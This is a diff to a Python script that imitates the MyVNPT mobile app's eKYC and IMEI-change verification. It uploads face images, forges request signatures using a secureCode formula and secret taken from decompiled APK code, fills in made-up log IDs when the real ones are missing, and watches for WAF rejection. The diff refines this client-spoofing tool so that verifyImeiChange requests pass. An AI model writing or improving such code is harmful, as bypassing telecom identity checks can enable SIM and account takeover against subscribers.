@@ -9487,7 +9487,7 @@ def _main_cli():
         return h
 
     def upload_image(path, name, title="ocr front", desc="ocr front old type"):
-        """Upload image to IDG file service, returns hash path"""
+        """Upload image to IDG file service, returns (hash_path, logID)"""
         url = f"{IDG_BASE}/file-service/v1/addFile"
         with open(path, "rb") as f:
             data = f.read()
@@ -9509,14 +9509,17 @@ def _main_cli():
             print(f"  addFile full response: {json.dumps(rj)[:300]}")
             obj = rj.get("object", {})
             h   = obj.get("hash", "") or obj.get("path", "") or rj.get("hash", "") or rj.get("path", "")
+            log_id = rj.get("logID", "") or rj.get("logId", "") or ""
             if h:
                 print(f"    hash/path: {h[:80]}")
             else:
                 print(f"    WARN: khong tim thay hash/path trong response!")
-            return h
+            if log_id:
+                print(f"    logID: {log_id}")
+            return h, log_id
         except Exception as e:
             print(f"  Upload ERROR: {e}")
-            return ""
+            return "", ""
 
     # ============================================================
     # ẢNH MẶT - t 2 file này vào th mc kyc_mobile:
@@ -9565,8 +9568,9 @@ def _main_cli():
             _liveness_upload_file = _lf
             break
     _liveness_fresh_hash = ""
+    _liveness_addfile_logid = ""
     if _liveness_upload_file:
-        _liveness_fresh_hash = upload_image(
+        _liveness_fresh_hash, _liveness_addfile_logid = upload_image(
             _liveness_upload_file,
             os.path.basename(_liveness_upload_file),
             title="liveness face",
@@ -9574,6 +9578,8 @@ def _main_cli():
         )
         if _liveness_fresh_hash:
             print(f"  [OK] Liveness upload hash: {_liveness_fresh_hash[:70]}")
+            if _liveness_addfile_logid:
+                print(f"  [OK] Liveness upload logID: {_liveness_addfile_logid}")
         else:
             print(f"  [WARN] Upload liveness anh that bai, thu dung MASK_HASH")
     else:
@@ -9592,16 +9598,19 @@ def _main_cli():
         FAR_HASH  = MASK_HASH if MASK_HASH else ""
         print(f"  [FALLBACK] Liveness: dung MASK_HASH ({NEAR_HASH[:70]})")
 
-    # MASK: Upload nh ONEBSS chnh chủ (khng dng hash cũ v face s sai  1314)
+    # MASK: Upload anh ONEBSS chinh chu
     print(f"\n  [UPLOAD] Upload ONEBSS portrait cho MASK (face comparison)...")
     MASK_HASH = ""
+    _mask_addfile_logid = ""
     mask_file = FACE_OWNER_FILE if os.path.exists(FACE_OWNER_FILE) else (
                 FACE_ANY_FILE if os.path.exists(FACE_ANY_FILE) else None)
     if mask_file:
-        MASK_HASH = upload_image(mask_file, os.path.basename(mask_file),
-                                 title="face mask", desc="face mask scan")
+        MASK_HASH, _mask_addfile_logid = upload_image(mask_file, os.path.basename(mask_file),
+                                                      title="face mask", desc="face mask scan")
         if MASK_HASH:
             print(f"  [OK] MASK hash uploaded: {MASK_HASH[:70]}")
+            if _mask_addfile_logid:
+                print(f"  [OK] MASK upload logID: {_mask_addfile_logid}")
         else:
             print(f"  [WARN] Upload that bai! Dung pre-captured hash (co the loi 1314)")
             MASK_HASH = FAR_HASH
@@ -9647,12 +9656,15 @@ def _main_cli():
         mask_rj        = r.json()
         MASK_DATA_B64  = mask_rj.get("dataBase64", "")
         MASK_DATA_SIGN = mask_rj.get("dataSign", "")
+        MASK_LOG_ID    = mask_rj.get("logID") or mask_rj.get("logId") or _mask_addfile_logid or f"{TOKEN_ID}-Zuulserver"
+        print(f"  MASK_LOG_ID: {MASK_LOG_ID}")
         print(f"  dataSign: {MASK_DATA_SIGN[:50]}..." if MASK_DATA_SIGN else "  No dataSign")
         if not MASK_DATA_SIGN:
             print(f"  Full response: {json.dumps(mask_rj)[:400]}")
     except Exception as e:
         print(f"  Face mask ERROR: {e}")
-        MASK_DATA_B64 = MASK_DATA_SIGN = MASK_LOG_ID = ""
+        MASK_DATA_B64 = MASK_DATA_SIGN = ""
+        MASK_LOG_ID = _mask_addfile_logid or f"{TOKEN_ID}-Zuulserver"
 
     # ===========================================================================
     # STEP 9: Liveness 3D detection
@@ -9670,6 +9682,7 @@ def _main_cli():
         "step_id":        0,
     }
     LIVE_HTTP_OK = False
+    LIVE_LOG_ID  = ""
     try:
         r = requests.post(live_url, headers=idg_headers(True), json=live_body,
                           timeout=60, verify=False)
@@ -9681,6 +9694,7 @@ def _main_cli():
         LIVE_FULL_TEXT = r.text          # Full JSON text - used by verifyImeiChange
         LIVE_DATA_B64  = live_rj.get("dataBase64", "")
         LIVE_DATA_SIGN = live_rj.get("dataSign", "")
+        LIVE_LOG_ID    = live_rj.get("logID") or live_rj.get("logId") or ""
         print(f"  dataSign: {LIVE_DATA_SIGN[:50]}..." if LIVE_DATA_SIGN else "  No dataSign")
 
         # Decode to show liveness result
@@ -9688,6 +9702,8 @@ def _main_cli():
             try:
                 live_plain = json.loads(base64.b64decode(LIVE_DATA_B64 + "=="))
                 obj        = live_plain.get("object", {})
+                if not LIVE_LOG_ID:
+                    LIVE_LOG_ID = live_plain.get("logID") or live_plain.get("logId") or ""
                 print(f"\n  === Liveness result ===")
                 print(f"  liveness:      {obj.get('liveness')}")
                 print(f"  liveness_msg:  {obj.get('liveness_msg')}")
@@ -9696,12 +9712,16 @@ def _main_cli():
                 print(f"  age:           {obj.get('age')}")
             except Exception:
                 print(f"  Full response: {json.dumps(live_rj)[:300]}")
+        if not LIVE_LOG_ID:
+            LIVE_LOG_ID = _liveness_addfile_logid or f"{TOKEN_ID}-Zuulserver"
+        print(f"  LIVE_LOG_ID: {LIVE_LOG_ID}")
         if not LIVE_DATA_SIGN:
             print(f"  Full response: {json.dumps(live_rj)[:300]}")
     except Exception as e:
         print(f"  Liveness ERROR: {e}")
         LIVE_DATA_B64 = LIVE_DATA_SIGN = ""
         LIVE_FULL_TEXT = ""
+        LIVE_LOG_ID = _liveness_addfile_logid or f"{TOKEN_ID}-Zuulserver"
 
     # ===========================================================================
     # STEP 3: saveLogEkyc - Report SDK call results to MyVNPT
@@ -9934,25 +9954,30 @@ def _main_cli():
         try:
             verify_url = "https://api-myvnpt.vnpt.vn/tel_service/imei/verifyImeiChange"
         
-            # liveNessFace = EkycLiveness.getDataBase64() from IDG SDK
-            # = the API's 'dataBase64' field (NOT base64 of full response text!)
-            # Source: TelecomSubscriberInfoViewModel.java line 222: setLiveNessFace(str2) where str2 = mEkycLiveness.getDataBase64()
-            live_face_b64 = LIVE_DATA_B64 or base64.b64encode(LIVE_FULL_TEXT.encode("utf-8")).decode("utf-8")
+            # FIX 4: liveNessFace = dataBase64 tu IDG SDK (khong fallback base64 cua ca JSON)
+            if not LIVE_DATA_B64:
+                raise RuntimeError("LIVE_DATA_B64 is empty - IDG SDK did not return dataBase64")
+            live_face_b64 = LIVE_DATA_B64
         
             # New requestId for this verify call
             VERIFY_REQ_ID = str(uuid.uuid4())
         
-            # liveNessFaceLogId & maskedFaceLogId: from IDG model getLogID()
-            # In FACE_ONLY flow, use "" if no explicit log IDs
-            live_face_log_id  = ""   # EkycLiveness.getLogID() - IDG doesn't return explicit logId
-            masked_face_log_id = ""  # EkycMarkFace.getLogID() - mask detection failed, use ""
+            # FIX 2: liveNessFaceLogId & maskedFaceLogId tu IDG SDK (...-Zuulserver)
+            live_face_log_id   = LIVE_LOG_ID or f"{TOKEN_ID}-Zuulserver"
+            masked_face_log_id = MASK_LOG_ID or f"{TOKEN_ID}-Zuulserver"
+            print(f"  liveNessFaceLogId: {live_face_log_id}")
+            print(f"  maskedFaceLogId:   {masked_face_log_id}")
+
+            # FIX 3: clientSession nhat quan voi SDK session
+            _verify_client_session = _ACTIVE_SESSION or CONFIG_CLIENT_SESSION or CLIENT_SESSION
+            print(f"  clientSession:     {_verify_client_session[:60]}...")
         
-            # CONFIRMED secureCode formula from TelecomSubscriberInfoViewModel.java line 230:
-            # SHA256(MSISDN|msisdnChangeImei|clientSession|challengeCode|""|""|""|""|liveNessFaceLogId|maskedFaceLogId|SECRET)
-            # Java: str + "|" + "" + "|" + "" + "|" + "" + "|" + "" + "|" + str4 + "|" + str7 + "|" + SECRET
-            # = 5 pipes between challengeCode and str4 (liveNessFaceLogId)!
+            # secureCode formula tu APK Uiv3VerifyEmeiViewModel:
+            # SHA256(MSISDN|msisdnChangeImei|clientSession|challengeCode|dataEKYC|front|back|compare|liveLog|maskLog|SECRET)
+            # FACE_ONLY flow: 5 dau | ngan cach giua challengeCode va liveNessFaceLogId
             VERIFY_SECURE = hashlib.sha256(
-                (f"{MSISDN}|{MSISDN}|{CLIENT_SESSION}|{CHALLENGE_CODE_HEX}|||||{live_face_log_id}|{masked_face_log_id}|{SECRET_AUTHEN}").encode()
+                (f"{MSISDN}|{MSISDN}|{_verify_client_session}|{CHALLENGE_CODE_HEX}"
+                 f"|||||{live_face_log_id}|{masked_face_log_id}|{SECRET_AUTHEN}").encode()
             ).hexdigest()
             print(f"  secureCode: {VERIFY_SECURE}")
         
@@ -9963,7 +9988,7 @@ def _main_cli():
                 "session":              SESSION_ID,
                 "requestId":            VERIFY_REQ_ID,
                 "challengeCode":        CHALLENGE_CODE_HEX,
-                "clientSession":        CLIENT_SESSION,
+                "clientSession":        _verify_client_session,
                 "secureCode":           VERIFY_SECURE,
                 # Card fields (empty for FACE_ONLY flow)
                 "dataEKYC":             "",
@@ -9982,7 +10007,7 @@ def _main_cli():
                 "liveNessFace":         live_face_b64,
                 "liveNessFaceSign":     LIVE_DATA_SIGN,
                 "liveNessFaceLogId":    live_face_log_id,
-                # Masked face (mask detection failed  empty)
+                # Masked face
                 "maskedFace":           MASK_DATA_B64 or "",
                 "maskedFaceSign":       MASK_DATA_SIGN or "",
                 "maskedFaceLogId":      masked_face_log_id,
@@ -10001,12 +10026,16 @@ def _main_cli():
             print(f"  request JSON length: {len(verify_json_str)} bytes")
             print(f"  Calling verifyImeiChange...")
 
-            # Multipart from source: postVerifyEmei(request, frontImage, backImage, portraitImage)
+            # FIX 5: portraitImage (far_portrait_preview.jpg tu APK)
             face_bytes = b""
             if os.path.exists(FACE_OWNER_FILE):
                 with open(FACE_OWNER_FILE, "rb") as fi:
                     face_bytes = fi.read()
+            if not face_bytes:
+                raise RuntimeError(f"portraitImage is empty - face file missing: {FACE_OWNER_FILE}")
+            print(f"  portrait: {len(face_bytes)} bytes")
 
+            # FIX 1: frontImage/backImage - khi rong (FACE_ONLY), APK gui filename="" text/plain
             cccd_front_bytes = b""
             if os.path.exists(CCCD_FRONT_FILE):
                 with open(CCCD_FRONT_FILE, "rb") as fi:
@@ -10018,11 +10047,21 @@ def _main_cli():
             print(f"  CCCD front bytes: {len(cccd_front_bytes)}")
             print(f"  CCCD back bytes:  {len(cccd_back_bytes)}")
 
+            if cccd_front_bytes:
+                _front_part = (os.path.basename(CCCD_FRONT_FILE), cccd_front_bytes, "image/jpeg")
+            else:
+                _front_part = ("", b"", "text/plain")
+
+            if cccd_back_bytes:
+                _back_part = (os.path.basename(CCCD_BACK_FILE), cccd_back_bytes, "image/jpeg")
+            else:
+                _back_part = ("", b"", "text/plain")
+
             _verify_files = [
                 ("request",        (None, verify_json_str, "application/json; charset=utf-8")),
-                ("frontImage",     (os.path.basename(CCCD_FRONT_FILE) or "front.jpg", cccd_front_bytes, "image/jpeg")),
-                ("backImage",      (os.path.basename(CCCD_BACK_FILE) or "back.jpg", cccd_back_bytes, "image/jpeg")),
-                ("portraitImage",  ("face.jpg", face_bytes, "image/jpg")),
+                ("frontImage",     _front_part),
+                ("backImage",      _back_part),
+                ("portraitImage",  ("far_portrait_preview.jpg", face_bytes, "image/jpg")),
             ]
             r = None
             for _attempt in range(2):  # retry 1 lan neu timeout
@@ -10047,8 +10086,21 @@ def _main_cli():
             print(f"  HTTP: {r.status_code}")
             resp_text_safe = r.text[:800]
             print(f"  Response: {resp_text_safe}")
-        
-            VERIFY_RESP = r.json()
+
+            # Detect WAF HTML response
+            _body = (r.text or "").lstrip()
+            if _body.lower().startswith(("<html", "<!doc")) or "request rejected" in _body.lower():
+                import re as _re
+                _sid = (_re.search(r"support\s+id\s+is\s*:\s*([A-Za-z0-9_-]+)", _body, _re.I) or type("",(),{"group":lambda s,n:""})()).group(1)
+                VERIFY_RESP = {"errorCode": "WAF_REJECTED", "supportId": _sid, "httpStatus": r.status_code}
+                print(f"  verifyImeiChange WAF REJECTED (supportId={_sid})")
+                raise RuntimeError(f"WAF_REJECTED: HTML response from gateway (supportId={_sid})")
+
+            try:
+                VERIFY_RESP = r.json()
+            except (ValueError, json.JSONDecodeError) as _je:
+                VERIFY_RESP = {"errorCode": "INVALID_JSON", "httpStatus": r.status_code, "body": r.text[:200]}
+                raise RuntimeError(f"INVALID_JSON: HTTP {r.status_code}") from _je
             ec = VERIFY_RESP.get("errorCode", "")
             msg = VERIFY_RESP.get("message", "")
             result_v = VERIFY_RESP.get("result", {})
